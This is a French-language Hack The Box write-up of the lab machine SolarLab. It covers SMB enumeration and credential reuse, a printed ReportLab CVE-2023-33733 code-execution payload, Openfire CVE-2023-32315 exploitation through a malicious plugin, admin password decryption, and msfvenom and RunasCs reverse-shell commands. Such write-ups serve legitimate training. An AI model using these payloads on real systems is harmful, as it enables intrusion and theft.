<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: SolarLab</title>
<meta name=description content="Platforme: Hack The Box Lien: SolarLab Niveau: Moyen OS: Windows SolarLab commence par un site web qui n&amp;rsquo;offre aucune voie d&amp;rsquo;exploitation directe. …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-solarlab/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: SolarLab"><meta property="og:description" content="Platforme: Hack The Box Lien: SolarLab Niveau: Moyen OS: Windows SolarLab commence par un site web qui n&amp;rsquo;offre aucune voie d&amp;rsquo;exploitation directe. …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-SolarLab/SolarLab.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-SolarLab/SolarLab.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: SolarLab"><meta name=twitter:description content="Platforme: Hack The Box Lien: SolarLab Niveau: Moyen OS: Windows SolarLab commence par un site web qui n&amp;rsquo;offre aucune voie d&amp;rsquo;exploitation directe. …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-solarlab/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-solarlab/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-SolarLab/SolarLab.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-solarlab/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-solarlab/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: SolarLab</h1><small role=doc-subtitle></small><p class=post-date>6 min read |
<span class=post-date>20 Septembre 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/SolarLab>SolarLab</a></li><li>Niveau: Moyen</li><li>OS: Windows</li></ul><hr><p>SolarLab commence par un site web qui n&rsquo;offre aucune voie d&rsquo;exploitation directe. Après avoir énuméré SMB, nous découvrons des informations d&rsquo;identification dans un partage de fichiers. Ces identifiants permettent d&rsquo;accéder à ReportHub, accessible par le biais d&rsquo;un sous-domaine découvert lors du balayage. En examinant ses fonctionnalités, nous identifions qu&rsquo;il génère des PDF en utilisant la bibliothèque ReportLab vulnérable au <code>CVE-2023-33733</code>. Grâce à cette vulnérabilité, nous obtenons notre accès initial et trouvons le drapeau utilisateur.</p><p>Une exploration plus poussée révèle plusieurs services internes, y compris une console d&rsquo;administration Openfire accessible via un tunnel. Le logiciel est obsolète, ce qui nous permet d&rsquo;exploiter le <code>CVE-2023-32315</code> pour obtenir un autre shell avec plus de privilèges. Enfin, en décryptant les informations d&rsquo;identification trouvées dans un fichier Openfire, nous obtenons un shell d&rsquo;administration et récupérons le drapeau root.</p><p>Addresse IP cibe - <code>10.10.11.16</code></p><h2 id=balayage>Balayage</h2><pre tabindex=0><code>nmap -sC -sV -oA nmap/SolarLab -p- 10.10.11.16
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-09-20 13:32 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.16
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.052s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>65530</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE       VERSION
</span></span><span style=display:flex><span>80/tcp   open  http          nginx 1.24.0
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://solarlab.htb/
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.24.0
</span></span><span style=display:flex><span>135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>445/tcp  open  microsoft-ds?
</span></span><span style=display:flex><span>6791/tcp open  http          nginx 1.24.0
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.24.0
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
</span></span><span style=display:flex><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2024-09-20T18:35:13
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   3:1:1: 
</span></span><span style=display:flex><span>|_    Message signing enabled but not required
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 176.37 seconds
</span></span></code></pre></div><p>Ports découverts :</p><ul><li>80 - HTTP avec Nginx 1.24.0 redirigeant vers <code>http://solarlab.htb/</code></li><li>135 - RPC</li><li>139 (NetBIOS) & 445 (SMB)</li><li>6791 - HTTP avec nginx avec une seconde redirection vers <code>http://report.solarlab.htb:6791/</code></li></ul><p>Mettons à jour le fichier hosts.</p><pre tabindex=0><code>sudo echo &#34;10.10.11.16 solarlab.htb report.solarlab.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumération>Enumération</h2><p>Le site web propose un service de messagerie censé être &ldquo;inviolable&rdquo;.</p><p><img src=/images/HTB-SolarLab/solarlab-website.png alt="SolarLab website"></p><p>Le code source de la page web ne révèle rien d&rsquo;utile.</p><p>Après avoir énuméré SMB, nous constatons que nous pouvons lire le partage <code>Documents</code>.</p><pre tabindex=0><code>netexec smb 10.10.11.16 -u Guest -p &#34;&#34; --shares
</code></pre><p><img src=/images/HTB-SolarLab/smb_enum.png alt="SolarLab shares enumeration"></p><p>Nous utilisons smbclient pour accéder au partage et trouvons quatre fichiers, deux juste après avoir accédé au partage et deux fichiers supplémentaires dans le répertoire <code>concepts</code>:</p><ul><li><code>details-file.xlsx</code></li><li><code>old_leave_request_form.docx</code></li><li><code>Training-Request-Form.docx</code></li><li><code>Travel-Request-Sample.docx</code></li></ul><pre tabindex=0><code>smbclient //10.10.11.16/Documents -U Guest
</code></pre><p><img src=/images/HTB-SolarLab/share_files.png alt="SolarLab shares files"></p><p>Nous pouvons télécharger tous les fichiers avec <code>get</code>.</p><p><img src=/images/HTB-SolarLab/files-downloads.png alt="SolarLab shares files download"></p><p>Après avoir examiné chaque document, nous trouvons des informations d&rsquo;identification dans le fichier <code>details-file.xlsx</code>.</p><p><img src=/images/HTB-SolarLab/password-file.png alt="Credentials found"></p><p>Jusque-là, la seule façon d&rsquo;utiliser ces informations d&rsquo;identification est d&rsquo;utiliser le protocole SMB. Il s&rsquo;avère que ces informations d&rsquo;identification sont valides mais les partages disponibles sont toujours les mêmes que ceux auxquels nous pouvions accéder avec le compte guest.</p><pre tabindex=0><code>netexec smb 10.10.11.16 -u KAlexander -p &#34;dkjafblkjadsfgl&#34;

netexec smb 10.10.11.16 -u blake -p &#34;ThisCanB3typedeasily1@&#34;

netexec smb 10.10.11.16 -u ClaudiaS -p &#34;dadsfawe9dafkn&#34;
</code></pre><p><img src=/images/HTB-SolarLab/smb_logins.png alt="SMB logins"></p><p>L&rsquo;énumération des répertoires est également infructueuse.</p><pre tabindex=0><code>gobuster dir -u http://solarlab.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</code></pre><p><img src=/images/HTB-SolarLab/gobuster.png alt="SolarLab directory bruteforcing"></p><p>Examinons le sous-domaine. Lorsque nous allons sur <code>http://report.solarlab.htb:6791/</code>, nous trouvons un formulaire de connexion pour ReportHub.</p><p><img src=/images/HTB-SolarLab/reporthub_solarlab.png alt="SolarLab report subdomain"></p><p>Les seules informations d&rsquo;identification dont nous disposons jusqu&rsquo;à présent sont celles du fichier de mots de passe. Après plusieurs tentatives, nous parvenons à nous connecter avec <code>blakeb:ThisCanB3typedeasily1@</code>.</p><p><img src=/images/HTB-SolarLab/dashboard.png alt="SolarLab Dashboard"></p><p>Nous pouvons choisir l&rsquo;option souhaitée, remplir le formulaire et obtenir un fichier pdf. Nous pouvons également télécharger une image pour la signature (ce qui pourrait être un moyen d&rsquo;exploiter la cible).</p><p><img src=/images/HTB-SolarLab/Leave-Request-form.png alt="Leave request form"></p><p>Voici un exemple du PDF généré.</p><p><img src=/images/HTB-SolarLab/pdf-generated.png alt="pdf generated"></p><h2 id=accès-initial>Accès Initial</h2><p>En utilisant exiftool sur le PDF généré, nous découvrons qu&rsquo;il est produit par reportlab.</p><pre tabindex=0><code>exiftool output.pdf
</code></pre><p><img src=/images/HTB-SolarLab/output_pdf.png alt="exiftool results"></p><p>Nous trouvons un PoC pour Reportlab (<a href="https://ethicalhacking.uk/cve-2023-33733-rce-in-reportlabs-html-parser/#gsc.tab=0">CVE-2023-33733</a>) qui mène à un RCE <a href=https://github.com/c53elyas/CVE-2023-33733/tree/master>ici</a>.</p><blockquote><p>J&rsquo;utilise ici l&rsquo;option <code>Travel Approval</code> mais vous pouvez faire fonctionner l&rsquo;exploit avec les autres options.</p></blockquote><p><img src=/images/HTB-SolarLab/Travel_Approval.png alt="Travel Approval"></p><p>Après avoir capturé la requête et l&rsquo;avoir envoyée au repeater avec Burp, nous insérons notre payload et nous nous assurons que la valeur <code>filename</code> correspond à celle de <code>Content-Type</code>.</p><blockquote><p>Nous obtenons un shell inversé sur <a href=https://www.revshells.com/>revshells</a> en utilisant l&rsquo;option <code>PowerShell #3 (Base64)</code>.</p></blockquote><p><img src=/images/HTB-SolarLab/payload-RCE.png alt="ReportLab RCE"></p><p><strong>Payload utilisé</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-HTML data-lang=HTML><span style=display:flex><span>&lt;<span style=color:#e06c75>para</span>&gt;&lt;<span style=color:#e06c75>font</span> <span style=color:#e06c75>color</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;[[[getattr(pow, Word(&#39;__globals__&#39;))[&#39;os&#39;].system(&#39;INSERT_REVSHELL_HERE&#39;) for Word in [ orgTypeFun( &#39;Word&#39;, (str,), { &#39;mutated&#39;: 1, &#39;startswith&#39;: lambda self, x: 1 == 0, &#39;__eq__&#39;: lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#39;mutate&#39;: lambda self: { setattr(self, &#39;mutated&#39;, self.mutated - 1) }, &#39;__hash__&#39;: lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and &#39;red&#39;&#34;</span>&gt;
</span></span><span style=display:flex><span>                exploit
</span></span><span style=display:flex><span>&lt;/<span style=color:#e06c75>font</span>&gt;&lt;/<span style=color:#e06c75>para</span>&gt;
</span></span></code></pre></div><p>Sur notre listener, nous obtenons un shell en tant que Blake et le drapeau utilisateur se trouve dans le répertoire Desktop.</p><p><img src=/images/HTB-SolarLab/user_flag.png alt="User flag"></p><h3 id=shell-en-tant-que-openfire>Shell en tant que openfire</h3><p>Nous constatons la présence d&rsquo;un autre utilisateur <code>openfire</code> sur la cible .</p><p><img src=/images/HTB-SolarLab/users_list.png alt="User list"></p><p>Avec <code>netstat -ano</code> nous obtenons tous les services fonctionnant sur la cible. Pour accéder aux services internes, nous utilisons le tunneling.</p><blockquote><p>Personnellement, je préfère <a href=https://github.com/nicocha30/ligolo-ng>ligolo-ng</a>, mais vous pouvez également utiliser <a href=https://github.com/jpillora/chisel>chisel</a>.</p></blockquote><p><img src=/images/HTB-SolarLab/netstat.png alt="netstat command"></p><p>Après avoir essayé plusieurs ports, nous trouvons une console d&rsquo;administration Openfire sur le port 9090.</p><p><img src=/images/HTB-SolarLab/Openfire-console.png alt="Openfire admin console"></p><p>Aucune des informations d&rsquo;identification dont nous disposons ne fonctionne. Je reconnais cette version obsolète d&rsquo;Openfire, elle est vulnérable au <a href=https://vulncheck.com/blog/openfire-cve-2023-32315>CVE-2023-32315</a> avec un PoC disponible <a href=https://github.com/miko550/CVE-2023-32315>ici</a>.</p><blockquote><p>La méthode d&rsquo;exploitation est la même pour HTB: Jab, mais nous avions déjà les identifiants pour nous connecter à la console.</p></blockquote><ol><li>Nous nous connectons avec le compte nouvellement créé</li></ol><pre tabindex=0><code>python3 CVE-2023-32315.py -t http://240.0.0.1:9090
</code></pre><p><img src=/images/HTB-SolarLab/openfire-new-account.png alt="Openfire new account"></p><p>Une fois connecté, nous devons télécharger un plugin malveillant dans la section <code>Plugin</code>. Le plugin malveillant est le fichier <code>openfire-management-tool-plugin.jar</code> disponible sur le repo du PoC sur Github.</p><p><img src=/images/HTB-SolarLab/malicious-plugin.png alt="Openfire malicious plugin"></p><p>Allez dans <code>Server</code> &ndash;> <code>Server Settings</code> &ndash;> <code>Management Tool</code>, entrez le mot de passe <code>123</code> et cliquez sur <code>Login</code>. Vous obtenez des informations sur le serveur.</p><p>Sélectionnez <code>system command</code> dans le menu déroulant.</p><p><img src=/images/HTB-SolarLab/system_cmd.png alt="Openfire system command"></p><p>De retour sur <a href=https://www.revshells.com/>revshells</a> nous obtenons un autre shell inversé Powershell et après l&rsquo;avoir exécuté, nous obtenons un shell en tant que <code>openfire</code>.</p><p><img src=/images/HTB-SolarLab/execute-cmd.png alt="Openfire execute command"></p><p><img src=/images/HTB-SolarLab/openfire_shell.png alt="Openfire shell"></p><h2 id=elévation-de-privilèges-shell-admin>Elévation de Privilèges (shell admin)</h2><p>Nous n&rsquo;avons toujours pas accès au compte administrateur, mais après une exploration du système, nous trouvons un fichier appelé <code>openfire.script</code> dans <code>C:\Program Files\Openfire\embedded-db</code>.</p><p>Le fichier contient les informations d&rsquo;identification de l&rsquo;utilisateur admin mais le mot de passe doit être décrypté. Heureusement, nous avons le hachage du mot de passe et la clé.</p><p><img src=/images/HTB-SolarLab/encrypted-pwd.png alt="Openfire encrypted password"></p><ul><li>Password hash: <code>becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442</code></li><li>Key value: <code>hGXiFzsKaAeYLjn</code></li></ul><p>Nous pouvons décrypter le mot de passe avec <a href=https://github.com/c0rdis/openfire_decrypt>openfire_decrypt</a> en utilisant la commande ci-dessous.</p><pre tabindex=0><code>java OpenFireDecryptPass [PASSWORD_HASH] [KEY_VALUE]
</code></pre><p><img src=/images/HTB-SolarLab/java-openfire-decrypt.png alt="Openfire password decrytion"></p><p>Les identifiants de l&rsquo;administrateur sont: <code>admin:ThisPasswordShouldDo!@</code></p><p>Les tentatives de connexion avec Evil-WinRM ne fonctionnant pas, nous avons recours à RunasCs.</p><pre tabindex=0><code>msfvenom -p windows/x64/shell_reverse_tcp lhost=YOUR_IP lport=PORT_NUMBER -f exe -a x64 --platform windows -o shell.exe
</code></pre><p>Après avoir envoyé <code>shell.exe</code> et <code>RunasCs.exe</code> à la cible, nous exécutons la commande ci-dessous.</p><pre tabindex=0><code>.\runascs.exe administrator ThisPasswordShouldDo!@ powershell -r 10.10.14.176:5555
</code></pre><p><img src=/images/HTB-SolarLab/runascs_root.png alt="runascs root command"></p><p>Nous obtenons un shell en tant qu&rsquo;administrateur et nous pouvons lire le drapeau root dans le répertoire Desktop.</p><p><img src=/images/HTB-SolarLab/root_flag.png alt="root shell & root flag"></p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/thm-fridayovertime/>&#8592;
Précédent:
THM: Friday Overtime</a></p><p class=prev-post-date>septembre 19, 2024</p></div><div class=next-post><p><a href=/fr/posts/htb-boardlight/>Suivant:
HTB: BoardLight
&#8594;</a></p><p class=next-post-date>septembre 27, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial>Accès Initial</a><ul><li><a href=#shell-en-tant-que-openfire>Shell en tant que openfire</a></li></ul></li><li><a href=#elévation-de-privilèges-shell-admin>Elévation de Privilèges (shell admin)</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>